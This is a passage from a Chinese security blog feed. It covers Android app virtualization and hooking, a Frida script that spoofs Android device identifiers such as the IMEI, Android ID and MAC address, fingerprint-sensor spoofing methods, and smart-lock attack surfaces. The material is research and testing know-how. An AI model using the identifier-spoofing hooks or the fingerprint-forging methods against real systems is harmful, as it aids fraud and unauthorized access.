entry_point_from_jni_; //jni函数入口</span><br><span class="line"></span><br><span class="line">    // 以quick code调用时的函数入口</span><br><span class="line">    void* entry_point_from_quick_compiled_code_;</span><br><span class="line">  &#125; ptr_sized_fields_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>例如，hook Log.i()函数的实现如下图：</p><p><img src="/images/pasted-200.png" alt="upload successful"></p><p>找到Log.i()函数对应的ArtMethod对象，其对应的entry_point指向Log.i()函数的指令，修改对应指令的前8个字节，使程序执行到预先分配好的内存（图中的0x7f132450），这段内存的指令实现一个分发器的功能，例如判断是否需要hook，如不修要跳回原来的地址执行，如需要hook，则跳转到另一个java方法的entrypoint执行。</p><p>Epic的原理虽然简单，但实现起来需要维护堆栈平衡，以及需要支持6.0，7.0，8.0，9.0等不同系统上的ART实现，例如第一次运行的时候采用的还是解释执行的方式，需要手动触发编译成机器码等等。</p><h2 id="三、Vitual-APP应用"><a href="#三、Vitual-APP应用" class="headerlink" title="三、Vitual APP应用"></a>三、Vitual APP应用</h2><p>Vitual APP作为Andoird APP上的虚拟技术，有比较广泛的应用，例如：</p><ul><li><p>应用多开</p><p>  如微信多开这样的需求，需要注意的是，由于多开应用和Vitual APP处于同一个进程空间，多开的应用数据会被互相读取，彼此之间没有沙箱隔离机制。</p><p>  另外，多开技术也广泛被黑产、羊毛党等利用，是他们用更低的成本来获取更多的利润。</p></li><li><p>监测工具<br>  Vitual APP这种“自我hook”的技术也可以用于APP自身的监控，例如hook一些敏感API的调用，监测和记录第三方SDK有没有其他恶意行为。也可以用于一些自动化的测试、埋点分析等。</p></li><li><p>hook<br>  由于可以实现无root环境下的hook，Vitual APP技术可以用来模拟数据（如修改定位数据、修改设备参数）、制作插件（如抢红包插件）等</p></li><li><p>免杀<br>  由于Vitual APP的特性，恶意应用通过将恶意代码加密存储在虚拟环境中，实现动态调用。传统的静态检测皆是对应用的包名、证书、代码等进行识别，识别的则是Vitual APP的信息，没有恶意特征，因此躲避了查杀。</p></li></ul><p>参考资料：</p><ol><li>VitualAPP <a href="https://github.com/asLody/VirtualApp" target="_blank" rel="noopener">https://github.com/asLody/VirtualApp</a></li><li>太极 <a href="https://www.taichi-app.com/#/about" target="_blank" rel="noopener">https://www.taichi-app.com/#/about</a></li><li>epic <a href="https://github.com/tiann/epic" target="_blank" rel="noopener">https://github.com/tiann/epic</a></li><li>epic原理 <a href="http://weishu.me/2017/11/23/dexposed-on-art/" target="_blank" rel="noopener">http://weishu.me/2017/11/23/dexposed-on-art/</a></li><li>VirtualApp沙盒基本原理 <a href="http://rk700.github.io/2017/03/15/virtualapp-basic/" target="_blank" rel="noopener">http://rk700.github.io/2017/03/15/virtualapp-basic/</a></li><li>应用多开对抗 <a href="https://bbs.pediy.com/thread-255212.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-255212.htm</a></li><li>VitualAPP非官方文档 <a href="https://github.com/prife/VirtualAppDoc" target="_blank" rel="noopener">https://github.com/prife/VirtualAppDoc</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>利用Frida修改Android设备的唯一标识符</title>
      <link href="/2018/12/20/%E5%88%A9%E7%94%A8Frida%E4%BF%AE%E6%94%B9Android%E8%AE%BE%E5%A4%87%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E5%BF%97%E7%AC%A6/"/>
      <url>/2018/12/20/%E5%88%A9%E7%94%A8Frida%E4%BF%AE%E6%94%B9Android%E8%AE%BE%E5%A4%87%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E5%BF%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="Android设备的唯一标识符"><a href="#Android设备的唯一标识符" class="headerlink" title="Android设备的唯一标识符"></a>Android设备的唯一标识符</h2><h3 id="1-IMEI-（手机的身份证号码）"><a href="#1-IMEI-（手机的身份证号码）" class="headerlink" title="1.IMEI （手机的身份证号码）"></a>1.IMEI （手机的身份证号码）</h3><p>IMEI(International Mobile Equipment Identity)是国际移动设备身份码的缩写，国际移动装备辨识码，是由15位数字组成的”电子串号”，它与每台移动电话机一一对应，而且该码是全世界唯一的。每一只移动电话机在组装完成后都将被赋予一个全球唯一的一组号码，这个号码从生产到交付使用都将被制造生产的厂商所记录。</p><p>有些设备的IMEI有两个，可以在拨号键盘输入“*#06#”查看。普通APP获取需要申请权限()：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//权限 &lt;uses-permissionandroid:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;</span><br><span class="line">TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">//获取IMEI号</span><br><span class="line">String imei = telephonyManager.getDeviceId();</span><br></pre></td></tr></table></figure></p><h3 id="2-IMSI-（SIM卡的身份证号码）"><a href="#2-IMSI-（SIM卡的身份证号码）" class="headerlink" title="2.IMSI （SIM卡的身份证号码）"></a>2.IMSI （SIM卡的身份证号码）</h3><p>IMSI是区别移动用户的标志，储存在SIM卡中，可用于区别移动用户的有效信息。其总长度不超过15位，同样使用0～9的数字，例如460010280100023。其中MCC是移动用户所属国家代号，占3位数字，中国的MCC规定为460；MNC是移动网号码，最多由两位数字组成，用于识别移动用户所归属的移动通信网；MSIN是移动用户识别码，用以识别某一移动通信网中的移动用户，</p><p>IMSI与IMEI权限相同，获取代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//权限 &lt;uses-permissionandroid:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;</span><br><span class="line">TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">//获取IMSI号</span><br><span class="line">String imsi=telephonyManager.getSubscriberId();</span><br></pre></td></tr></table></figure></p><h3 id="3-ANDROID-ID"><a href="#3-ANDROID-ID" class="headerlink" title="3.ANDROID_ID"></a>3.ANDROID_ID</h3><p>ANDROID_ID 是一串64位的数字，并以16进制字符串的形式保存下来，是设备首次启动时随机生成的设备的第一个引导，其记录着一个固定值，通过它可以知道设备的寿命。ANDROID_ID也可视为作为唯一设备标识号的一个好选择，当设备没有手机号时，例如平板设备等，可以采用ANDROID_ID作为标识。<br>需要注意：</p><ul><li><strong>android_id在设备恢复出厂设置后，该值会改变</strong></li><li><strong>部分定制手机获取到的android_id为null</strong></li><li><strong>由于定制问题，不同的设备可能会产生相同的ANDROID_ID</strong></li><li><strong>Android 8.0后不同应用获得的值不同</strong><br>  应用签署密钥、用户和设备的每个组合都具有唯一的 ANDROID_ID 值。因此，在相同设备上运行但具有不同签署密钥的应用将不会再看到相同的 Android ID（即使对于同一用户来说，也是如此）参考<a href="https://developer.android.com/about/versions/oreo/android-8.0-changes?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/about/versions/oreo/android-8.0-changes?hl=zh-cn</a></li></ul><p>android_id获取方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import android.provider.Settings; </span><br><span class="line">String ANDROID_ID =Settings.System.getString(getContentResolver(),Settings.System.ANDROID_ID);</span><br></pre></td></tr></table></figure></p><h3 id="4-设备序列号（Serial-Number-或-SN）"><a href="#4-设备序列号（Serial-Number-或-SN）" class="headerlink" title="4.设备序列号（Serial Number 或 SN）"></a>4.设备序列号（Serial Number 或 SN）</h3><p>SN码是Serial Number的缩写，有时也叫SerialNo，也就是产品序列号，产品序列是为了验证“产品的合法身份”而引入的一个概念，它是用来保障用户的正版权益，享受合法服务的；一套正版的产品只对应一组产品序列号。别称：机器码、认证码、注册申请码等。</p><p>获取方式：</p><ul><li><p>1.adb shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.serialno</span><br></pre></td></tr></table></figure></li><li><p>2.android.os.Build</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String SerialNumber = android.os.Build.SERIAL;</span><br></pre></td></tr></table></figure></li><li><p>3.android.os.SystemProperties.get<br>此API为hidden API，需要反射获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = context.getClassLoader();</span><br><span class="line">Class SystemProperties = cl.loadClass(&quot;android.os.SystemProperties&quot;);</span><br><span class="line"></span><br><span class="line">//参数类型</span><br><span class="line">Class[] paramTypes= new Class[2];</span><br><span class="line">paramTypes[0]= String.class;</span><br><span class="line">paramTypes[1]= String.class;</span><br><span class="line"></span><br><span class="line">Method get = SystemProperties.getMethod(&quot;get&quot;, paramTypes);</span><br><span class="line"></span><br><span class="line">//参数</span><br><span class="line">Object[] params= new Object[2];</span><br><span class="line">params[0]= new String(key);</span><br><span class="line">params[1]= new String(def);</span><br><span class="line"></span><br><span class="line">ret= (String) get.invoke(SystemProperties, params);</span><br></pre></td></tr></table></figure></li></ul><p>除了SN号，还有制造商、品牌、型号、设备名等其他信息和SN的获取方式相同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">android.os.Build.BRAND：获取设备品牌</span><br><span class="line">android.os.Build.MODEL ：获取手机的型号 设备名称。</span><br><span class="line">android.os.Build.MANUFACTURER:获取设备制造商</span><br><span class="line">android.os.Build.BOARD：获取设备基板名称</span><br><span class="line">android.os.Build.BOOTLOADER:获取设备引导程序版本号</span><br><span class="line">android.os.Build.CPU_ABI：获取设备指令集名称（CPU的类型）</span><br><span class="line">android.os.Build.CPU_ABI2：获取第二个指令集名称</span><br><span class="line">android.os.Build.DEVICE：获取设备驱动名称</span><br><span class="line">android.os.Build.DISPLAY：获取设备显示的版本包（在系统设置中显示为版本号）和ID一样</span><br><span class="line">android.os.Build.FINGERPRINT：设备的唯一标识。由设备的多个信息拼接合成。</span><br><span class="line">android.os.Build.HARDWARE：设备硬件名称,一般和基板名称一样（BOARD）</span><br><span class="line">android.os.Build.HOST：设备主机地址</span><br><span class="line">android.os.Build.ID:设备版本号。</span><br><span class="line">android:os.Build.PRODUCT：整个产品的名称</span><br><span class="line">android:os.Build.RADIO：无线电固件版本号，通常是不可用的 显示unknown</span><br><span class="line">android.os.Build.TAGS：设备标签。如release-keys 或测试的 test-keys </span><br><span class="line">android.os.Build.TIME：时间</span><br><span class="line">android.os.Build.TYPE:设备版本类型  主要为&quot;user&quot; 或&quot;eng&quot;.</span><br><span class="line">android.os.Build.USER:设备用户名 基本上都为android-build</span><br><span class="line">android.os.Build.VERSION.RELEASE：获取系统版本字符串。如4.1.2 或2.2 或2.3等</span><br><span class="line">android.os.Build.VERSION.CODENAME：设备当前的系统开发代号，一般使用REL代替</span><br><span class="line">android.os.Build.VERSION.INCREMENTAL：系统源代码控制值，一个数字或者git hash值</span><br><span class="line">android.os.Build.VERSION.SDK：系统的API级别 一般使用下面大的SDK_INT 来查看</span><br><span class="line">android.os.Build.VERSION.SDK_INT：系统的API级别 数字表示</span><br></pre></td></tr></table></figure></p><h3 id="5-MAC地址"><a href="#5-MAC地址" class="headerlink" title="5.MAC地址"></a>5.MAC地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) context.getSystemService(Context.WIFI_SERVICE);</span><br><span class="line">String macAddress = wifi.getConnectionInfo().getMacAddress();</span><br></pre></td></tr></table></figure><ul><li><strong>没有 WiFi 硬件或者 WiFi 不可用的设备可能返回 null 或空</strong></li><li><strong>Android 6.0开始，谷歌为保护用户数据，用此方法获取到的 Wi-Fi mac 地址都为02:00:00:00:00:00</strong></li><li><strong>需要 ACCESS_WIFI_STATE 权限</strong></li></ul><h2 id="Frida-hook代码"><a href="#Frida-hook代码" class="headerlink" title="Frida hook代码"></a>Frida hook代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">var TelephonyManager = Java.use(&quot;android.telephony.TelephonyManager&quot;);</span><br><span class="line"></span><br><span class="line">    //IMEI hook</span><br><span class="line">    TelephonyManager.getDeviceId.overload().implementation = function () &#123;</span><br><span class="line">               console.log(&quot;[*]Called - getDeviceId()&quot;);</span><br><span class="line">               var temp = this.getDeviceId();</span><br><span class="line">               console.log(&quot;real IMEI: &quot;+temp);</span><br><span class="line">               return &quot;867979021642856&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">    // muti IMEI</span><br><span class="line">    TelephonyManager.getDeviceId.overload(&apos;int&apos;).implementation = function (p) &#123;</span><br><span class="line">               console.log(&quot;[*]Called - getDeviceId(int) param is&quot;+p);</span><br><span class="line">               var temp = this.getDeviceId(p);</span><br><span class="line">               console.log(&quot;real IMEI &quot;+p+&quot;: &quot;+temp);</span><br><span class="line">               return &quot;867979021642856&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //IMSI hook</span><br><span class="line">TelephonyManager.getSimSerialNumber.overload().implementation = function () &#123;</span><br><span class="line">               console.log(&quot;[*]Called - getSimSerialNumber(String)&quot;);</span><br><span class="line">               var temp = this.getSimSerialNumber();</span><br><span class="line">               console.log(&quot;real IMSI: &quot;+temp);</span><br><span class="line">               return &quot;123456789&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line">    //////////////////////////////////////</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //ANDOID_ID hook</span><br><span class="line">    var Secure = Java.use(&quot;android.provider.Settings$Secure&quot;);</span><br><span class="line">    Secure.getString.implementation = function (p1,p2) &#123;</span><br><span class="line">    if(p2.indexOf(&quot;android_id&quot;)&lt;0) return this.getString(p1,p2);</span><br><span class="line">    console.log(&quot;[*]Called - get android_ID, param is:&quot;+p2);</span><br><span class="line">    var temp = this.getString(p1,p2);</span><br><span class="line">    console.log(&quot;real Android_ID: &quot;+temp);</span><br><span class="line">    return &quot;844de23bfcf93801&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //android的hidden API，需要通过反射调用</span><br><span class="line">    var SP = Java.use(&quot;android.os.SystemProperties&quot;);</span><br><span class="line">    SP.get.overload(&apos;java.lang.String&apos;).implementation = function (p1) &#123;</span><br><span class="line">    var tmp = this.get(p1);</span><br><span class="line">    console.log(&quot;[*]&quot;+p1+&quot; : &quot;+tmp);</span><br><span class="line"></span><br><span class="line">    return tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    SP.get.overload(&apos;java.lang.String&apos;, &apos;java.lang.String&apos;).implementation = function (p1,p2) &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    var tmp = this.get(p1,p2)</span><br><span class="line">    console.log(&quot;[*]&quot;+p1+&quot;,&quot;+p2+&quot; : &quot;+tmp);</span><br><span class="line">    return tmp;</span><br><span class="line">    &#125; </span><br><span class="line">    // hook MAC</span><br><span class="line">    var wifi = Java.use(&quot;android.net.wifi.WifiInfo&quot;);</span><br><span class="line">    wifi.getMacAddress.implementation = function () &#123;</span><br><span class="line">    var tmp = this.getMacAddress();</span><br><span class="line">    console.log(&quot;[*]real MAC: &quot;+tmp);</span><br><span class="line">    return tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>指纹识别技术安全分析</title>
      <link href="/2018/12/12/%E6%8C%87%E7%BA%B9/"/>
      <url>/2018/12/12/%E6%8C%87%E7%BA%B9/</url>
      
        <content type="html"><![CDATA[<p>本文大部分总结和研究各种指纹识别的原理和安全性，作为日后指纹安全的参考wiki。</p><p>现阶段，任何一种生物特征识别，都是通过传感器把生物特征投影成像为数字信号，指纹也不例外。具体来说分为指纹图像提取、预处理、特征提取、比对等步骤。</p><p><img src="/images/pasted-172.png" alt="upload successful"></p><h2 id="指纹识别原理"><a href="#指纹识别原理" class="headerlink" title="指纹识别原理"></a>指纹识别原理</h2><p>根据指纹图像提取技术的不同，现阶段主要分为<strong>光学指纹</strong>、<strong>电容指纹</strong>、<strong>超声波指纹</strong>以及<strong>屏下指纹</strong>几大类。</p><h3 id="1-光学指纹"><a href="#1-光学指纹" class="headerlink" title="1.光学指纹"></a>1.光学指纹</h3><p>光学指纹识别的原理如下图，手指按在指纹采集器上后，内部的光源将光线打到手指上，经过手指反射后汇集到识别器上，获得指纹图像。</p><p><img src="/images/pasted-174.png" alt="upload successful"></p><p>现在有很多门禁、打卡机等等使用光学指纹识别技术，其缺点是如果手上有油污或者汗水，识别效果就会大幅度降低。</p><p><img src="/images/pasted-175.png" alt="upload successful"></p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>光学指纹传感器可靠，价格便宜</li></ol><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ol><li>手指湿水后影响光的反射</li><li>手指有干皮导致识别不了</li><li>可能会有痕迹遗留</li><li>无法识别活体，指纹可复制</li></ol><h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><ol><li>利用普通的蜡就可以制作假指纹</li><li>残留的指纹直接盖上纸片</li></ol><h3 id="2-电容指纹"><a href="#2-电容指纹" class="headerlink" title="2.电容指纹"></a>2.电容指纹</h3><p>电容感测的原理就是当用户将手指按在传感器上时，会测量出指纹引起的极小的电导率变化信号，然后用测量到的数据形成一副指纹的图像。手指最外层的皮肤也就是指纹，是不导电的，而指纹里面的皮下层是导电的</p><p><img src="/images/pasted-178.png" alt="upload successful"></p><p>电容指纹识别技术相比于光学传感器体积小、集成度高。所以这种传感器广泛应用于手机、便携设备等地方。例如高级门锁、保险箱等</p><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol><li>体积小，集成度高</li><li>图像质量较高</li><li>手指上的干皮不影响识别</li><li>依靠活体导电，有效对抗伪造</li></ol><h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ol><li>手指湿脏水后由于脏水导电，导致识别不准</li><li>成本高</li></ol><h4 id="攻击面-1"><a href="#攻击面-1" class="headerlink" title="攻击面"></a>攻击面</h4><ol><li>利通导电溶液制作假指纹</li></ol><h3 id="3-超声指纹"><a href="#3-超声指纹" class="headerlink" title="3.超声指纹"></a>3.超声指纹</h3><p>原理是利用超声波具有穿透材料的能力，且随材料的不同产生大小不同的回波。因此，利用皮肤与空气对于声波阻抗的差异，就可以区分指纹凹凸不平的图像，甚至能渗透到皮肤表面之下识别指纹独特的3D特征</p><p><img src="/images/pasted-179.png" alt="upload successful"></p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ol><li>湿手不影响识别</li></ol><h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ol><li>成本高</li><li>识别速度慢</li></ol><h4 id="攻击面-2"><a href="#攻击面-2" class="headerlink" title="攻击面"></a>攻击面</h4><ol><li>较难攻击</li></ol><h3 id="4-屏下指纹"><a href="#4-屏下指纹" class="headerlink" title="4.屏下指纹"></a>4.屏下指纹</h3><p>通俗地说，屏下指纹识别，就是将指纹识别器藏在屏幕下边，透过屏幕对用户的指纹进行信息采集和匹配识别。屏下指纹的识别传感器集成在了手机屏幕中，可以大幅提高移动设备的屏占比。</p><p><img src="/images/pasted-180.png" alt="upload successful"></p><p>屏下指纹可以结合<strong>光学识别</strong>、<strong>电容识别</strong>和<strong>超声波识别</strong>等多种方式，进一步的提高准确率和可靠性。</p><p>屏下指纹识别目前常见的方案有两种：光学指纹识别和超声波指纹识别。目前比较知名的屏下指纹识别方案商有高通、新思、汇顶和上海箩箕等，高通主要研究超声波方案；另外三家都是光学指纹识别方案，主要是考虑到成本和效率。</p><h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><ol><li>提高屏占比</li></ol><h4 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h4><ol><li>功耗较高</li><li>只能用OLED屏幕，这种屏幕有个不大不小的缺点，即圈内所说的“烧屏”——长时间在同一区域进行指纹识别操作（亮灯）可能会加快该区域屏幕的老化，就像灯泡坏了一样。</li></ol><h4 id="攻击面-3"><a href="#攻击面-3" class="headerlink" title="攻击面"></a>攻击面</h4><ol><li>痕迹残留攻击</li></ol><h2 id="指纹攻击"><a href="#指纹攻击" class="headerlink" title="指纹攻击"></a>指纹攻击</h2><p>指纹攻击主要有两个角度：</p><ol><li>通过指纹采集的方式获取原始指纹图像，进而制造一个假体指纹</li><li>通过文件读取等获取到指纹特征文件，根据指纹特征制造一个假体指纹（难度较高）</li></ol><h3 id="指纹图像的获取"><a href="#指纹图像的获取" class="headerlink" title="指纹图像的获取"></a>指纹图像的获取</h3><ul><li>带有指纹的高清晰照片（例如领导人挥手示意时）</li><li>合同、按手印活动等上面的指纹图像</li><li>通过模具成型获取到的指纹（例如明星在星光大道留下的掌印，有时精度较低）</li><li>获取手机、玻璃杯、指纹模块等上面留下的指纹痕迹</li></ul><h3 id="指纹制作"><a href="#指纹制作" class="headerlink" title="指纹制作"></a>指纹制作</h3><ul><li>光敏印章</li><li>导电材料</li></ul><p>参考资料：</p><ol><li>指纹识别传感器科普贴（一）：技术演变历程 <a href="http://www.mems.me/mems/overview_201703/4232.html" target="_blank" rel="noopener">http://www.mems.me/mems/overview_201703/4232.html</a></li><li>光学vs半导体，指纹智能锁哪一种更好用？<a href="https://zhuanlan.zhihu.com/p/39490067" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/39490067</a></li><li>深度剖析：手机指纹的马奇诺防线 <a href="https://paper.seebug.org/471/" target="_blank" rel="noopener">https://paper.seebug.org/471/</a></li><li>关于屏下指纹，我们做了很有趣的测试 <a href="https://zhuanlan.zhihu.com/p/43374532" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/43374532</a></li><li>一张纸秒破指纹解锁 <a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1544715502&amp;ver=1283&amp;signature=qiu1F0Hq5ZZNjvqtWbM6EyBmpKhFXmDhiRSv78hvdyKpH5pVVl-koBJ1VH08jSrynsOE90-7742z-bD7A2LyRt1hxOFpPZZRKlVUTAQ9gsfXy3HTK-QczhKn78x41-Vf&amp;new=1" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?src=11&amp;timestamp=1544715502&amp;ver=1283&amp;signature=qiu1F0Hq5ZZNjvqtWbM6EyBmpKhFXmDhiRSv78hvdyKpH5pVVl-koBJ1VH08jSrynsOE90-7742z-bD7A2LyRt1hxOFpPZZRKlVUTAQ9gsfXy3HTK-QczhKn78x41-Vf&amp;new=1</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>智能门锁安全分析</title>
      <link href="/2018/12/11/%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81/"/>
      <url>/2018/12/11/%E6%99%BA%E8%83%BD%E9%97%A8%E9%94%81/</url>
      
        <content type="html"><![CDATA[<p>本文搜集所有和只能门锁相关的漏洞、设计、案例等。本文大部分内容来自CNCERT发布的《智能门锁网络安全分析报告》，结合其他资料作的搜集，作为日后智能门锁安全的wiki。</p><h4 id="一、门锁设计相关"><a href="#一、门锁设计相关" class="headerlink" title="一、门锁设计相关"></a>一、门锁设计相关</h4><p>两种架构：门锁直接联网、门锁通过手机联网</p><p>四种角色：主人、长期居住、重复访客、临时访客</p><p>门锁的交互介质：蓝牙、NFC、RFID、WiFi、数据流量</p><h4 id="二、几种开锁的方式以及攻击面"><a href="#二、几种开锁的方式以及攻击面" class="headerlink" title="二、几种开锁的方式以及攻击面"></a>二、几种开锁的方式以及攻击面</h4><h5 id="1-固定密码开锁"><a href="#1-固定密码开锁" class="headerlink" title="1.固定密码开锁"></a>1.固定密码开锁</h5><h6 id="实现机制："><a href="#实现机制：" class="headerlink" title="实现机制："></a>实现机制：</h6><p>安装时先进行门锁初始化，并完成密码设置，该密码存储在智能门锁的固态存储空间，有时也可能会上传到云端进行存储。在用户开锁时，在门锁上输入密码，如果输入的密码与预先设置的密码一致，则可打开门锁。（该模式本质上相当于用密码去登录一个账户）</p><h6 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h6><p>暴力破解、密码重置漏洞、按键痕迹残留、默认密码、后门密码等</p><h6 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h6><p>暂无</p><h5 id="2-临时密码开锁"><a href="#2-临时密码开锁" class="headerlink" title="2.临时密码开锁"></a>2.临时密码开锁</h5><h6 id="实现机制"><a href="#实现机制" class="headerlink" title="实现机制"></a>实现机制</h6><p>户主会通过手机APP从云端获取当前时段开锁的临时密码，并通过短信、微信或者手机APP等方式将临时密码发送给访客。访客在门锁上输入接收到的临时密码后，门锁会将该密码与云端自动生成的当前时段临时密码进行对比，如果成功，则开锁。</p><h6 id="攻击面-1"><a href="#攻击面-1" class="headerlink" title="攻击面"></a>攻击面</h6><p>临时密码有效期、临时密码泄露、</p><h6 id="漏洞案例-1"><a href="#漏洞案例-1" class="headerlink" title="漏洞案例"></a>漏洞案例</h6><h5 id="3-生物信息开锁"><a href="#3-生物信息开锁" class="headerlink" title="3.生物信息开锁"></a>3.生物信息开锁</h5><h6 id="实现机制-1"><a href="#实现机制-1" class="headerlink" title="实现机制"></a>实现机制</h6><p>生物特征主要有指纹、掌纹、虹膜和人脸等。该类门锁在安装的过程中，会将指纹、掌纹、虹膜和人脸等生物特征初始化到智能门锁固态存储或者云端。用户开锁时，门锁需要采集用户的指纹、掌纹、虹膜和人脸特征，并传统到云端与初始化特征进行对比，如果对比成功，则开锁。</p><h6 id="攻击面-2"><a href="#攻击面-2" class="headerlink" title="攻击面"></a>攻击面</h6><p>指纹泄露、指纹残留、人脸（图片）、</p><h6 id="漏洞案例-2"><a href="#漏洞案例-2" class="headerlink" title="漏洞案例"></a>漏洞案例</h6><h5 id="4-智能卡开锁"><a href="#4-智能卡开锁" class="headerlink" title="4.智能卡开锁"></a>4.智能卡开锁</h5><h6 id="实现机制-2"><a href="#实现机制-2" class="headerlink" title="实现机制"></a>实现机制</h6><p>用于智能门锁开锁的智能卡主要有RFID卡、NFC卡和CPU卡三类，该类门锁主要应用在酒店和公寓等场景。</p><ul><li><p>使用RFID卡的门锁，门禁管理系统会在RFID卡中写入代表该卡身份的字符串，在开锁时，门锁提取RFID卡中的字符串，并传输到云端进行对比，对比成功，则开锁。</p></li><li><p>使用NFC卡和CPU卡的门锁，门禁管理系统会在NFC卡和CPU卡中写入代表该卡身份的私钥和公钥，在开锁时，该卡通过门锁与云端进行双向身份认证，如果认证成功，门锁接收到云端的开锁指令，打开门锁。</p></li></ul><h6 id="攻击面-3"><a href="#攻击面-3" class="headerlink" title="攻击面"></a>攻击面</h6><p>卡片复制、未设置滚动码</p><h6 id="漏洞案例-3"><a href="#漏洞案例-3" class="headerlink" 